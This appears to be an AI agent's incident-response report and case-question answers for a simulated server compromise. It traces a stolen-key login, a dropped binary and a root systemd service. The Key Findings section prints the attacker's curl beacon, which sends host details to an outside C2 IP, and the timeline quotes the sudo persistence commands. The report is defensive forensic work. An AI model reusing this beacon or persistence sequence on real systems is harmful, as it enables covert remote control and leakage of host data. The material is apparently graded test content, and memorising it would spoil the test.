All claims accepted. Here is the final report.

---

# Incident Response Report — webserver-prod-02

## Executive Summary

The production web server **webserver-prod-02** was compromised on **April 14 at 03:17 UTC** via a stolen SSH private key for the **deploy** service account. The attacker, connecting from **185.229.59.103** (confirmed C2 infrastructure), leveraged deploy's overly permissive NOPASSWD sudo access to `systemctl` to install a persistent C2 beacon disguised as a system update service. The attacker's commands do not appear in any shell history file, though they are fully captured in the auth.log sudo trail.

## Attack Timeline

| Time (UTC) | Event | Source |
|---|---|---|
| Apr 14 03:17:44 | Attacker logs in as `deploy` from 185.229.59.103 via stolen SSH key | auth.log:30 |
| Apr 14 03:18:02 | Recon: `sudo cat /etc/passwd` | auth.log:32 |
| Apr 14 03:18:12 | Drops binary: `sudo cp /tmp/update /usr/local/bin/update` | auth.log:35 |
| Apr 14 03:18:17 | Makes binary executable: `sudo chmod +x /usr/local/bin/update` | auth.log:36 |
| Apr 14 03:18:29 | Writes C2 beacon unit: `sudo tee /etc/systemd/system/system-updater.service` | auth.log:37 |
| Apr 14 03:18:44 | Reloads systemd: `sudo systemctl daemon-reload` | auth.log:38 |
| Apr 14 03:18:58 | Enables persistence: `sudo systemctl enable system-updater.service` | auth.log:39 |
| Apr 14 03:19:03 | Starts beacon: `sudo systemctl start system-updater.service` | auth.log:40 |
| Apr 14 03:20:51 | Attacker disconnects | auth.log:41 |

## Key Findings

### 1. Initial Access — Compromised SSH Key (CONFIRMED)
The attacker authenticated as `deploy` from **185.229.59.103** using the same RSA key fingerprint (`SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ`) used by the legitimate CI runner at 10.0.1.50. There were zero failed login attempts — the attacker possessed the private key. The deploy account's `authorized_keys` file contains two RSA keys (`deploy@ci-runner-1` and `deploy@ci-backup`).

### 2. Persistence — Malicious systemd Service (CONFIRMED)
The attacker installed `system-updater.service` which runs as root and executes:
```
/usr/bin/curl -sX POST https://185.229.59.103:8443/beacon -d "host=$(hostname)&ip=$(hostname -I)"
```
This beacons the host's identity to the C2 server every 600 seconds with auto-restart. The IP **185.229.59.103** is a confirmed C2 server per threat intelligence lookup.

### 3. Privilege Escalation — Sudoers Misconfiguration (CONFIRMED)
`/etc/sudoers.d/deploy` grants: `deploy ALL=(root) NOPASSWD: /usr/bin/systemctl` with no argument restrictions. This allowed the attacker to run `systemctl enable`, `systemctl start`, and `systemctl daemon-reload` as root without a password — effectively allowing installation of arbitrary root-level services.

### 4. Dropped Binary (CONFIRMED)
The attacker copied `/tmp/update` to `/usr/local/bin/update` and made it executable. The purpose of this binary is unknown from the available evidence.

### 5. Shell History Gaps (INFERENCE)
Deploy's `.bash_history` contains 15 routine CI/CD commands (git, npm, docker) but none of the 9 malicious sudo commands from the 03:17–03:20 session. This suggests the attacker cleared history entries, used a non-interactive shell, or otherwise avoided bash history recording.

## Shell History Analysis

### 6. No shell history reveals the attacker's actions directly
The attacker's activity is **only visible in the auth.log sudo trail**, not in any bash_history file. All three analyzed histories contain only benign, routine commands.

## IOC Summary

| IOC | Type | Context |
|---|---|---|
| 185.229.59.103 | IP (C2 server) | SSH login source + beacon destination |
| /etc/systemd/system/system-updater.service | Persistence | C2 beacon unit |
| /usr/local/bin/update | Dropped binary | Unknown payload |
| SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ | SSH key fingerprint | Compromised deploy key |

## Recommendations

1. **Immediate**: Disable and remove `system-updater.service`; remove `/usr/local/bin/update`
2. **Rotate** all SSH keys for the `deploy` account; investigate how the private key was compromised
3. **Restrict** the sudoers entry to specific systemctl subcommands (e.g., `systemctl restart nginx` only)
4. **Block** 185.229.59.103 at the network perimeter
5. **Investigate** the CI runner (10.0.1.50) and backup systems for key compromise

---

## Case Questions

**Case Q1:** Shell histories were analyzed for three accounts: **root** (4 commands — apt update, apt upgrade, systemctl restart nginx, tail log), **deploy** (15 commands — git, npm, curl, systemctl status, docker ps, and other CI/CD operations), and **alice** (6 commands — ls, cd /var/log, tail access.log, sudo journalctl, sudo systemctl status, exit). **Bob** had no shell history file despite logging in twice (Apr 13 and Apr 14).

**Case Q2:** No — none of the three shell history files contain the attacker's malicious commands. The attacker's actions (reconnaissance via `cat /etc/passwd`, dropping a binary via `cp /tmp/update`, installing and enabling the C2 beacon `system-updater.service`) are recorded **only in the auth.log sudo trail** (lines 32–40), not in any `.bash_history` file. Deploy's history contains only routine CI/CD commands, suggesting the attacker's session either did not record to bash_history or the entries were cleared.